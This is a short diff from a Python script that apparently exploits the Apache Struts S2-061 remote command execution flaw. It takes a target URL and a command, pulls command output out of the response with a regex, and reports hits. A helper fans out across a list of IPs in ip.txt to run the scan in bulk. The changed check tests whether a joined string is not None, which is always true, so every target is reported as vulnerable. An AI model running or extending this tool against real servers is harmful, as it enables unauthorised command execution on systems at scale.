@@ -57,19 +57,14 @@ def Struts_061(targetUrl, cmd):
                             verify=False,
                             proxies=proxies)
                             # proxies={'socks5': 'http://127.0.0.1:1081'})
-        print(re.compile(r'id\=\"(.*?)\"',re.DOTALL).findall(res.text))
-        # if "<a" in res.text and "uid" in res.text or "gid" in res.text:
-        #     print("[+] URL:{}".format(targetUrl))
-        #     print("[+] Command success result: " + res.text + "\n")
-        #     with open("存在漏洞地址.txt", 'a') as fw:
-        #         fw.write(targetUrl + '\n')
-        # else:
-        #     print("[-] " + targetUrl + " 没有发现Struts漏洞.\n")
-    # # except Exception as e:
-    # #     print(e)
+        requests_data = "".join(re.compile(r'id\=\"(.*?)\"',re.DOTALL).findall(res.text))
+        if requests_data is not None:
+            print("[+] URL:{}".format(targetUrl))
+            print("[+] Command success result: " + requests_data + "\n")
+        else:
+            print("[-] " + targetUrl + " 没有发现Strus_061漏洞.\n")
     except:
         print('报错了')
-        # print("[-] " + url + " Request ERROR.\n")
 def multithreading(cmd,filename="ip.txt", pools=5):
     works = []
     with open(filename, "r") as f:
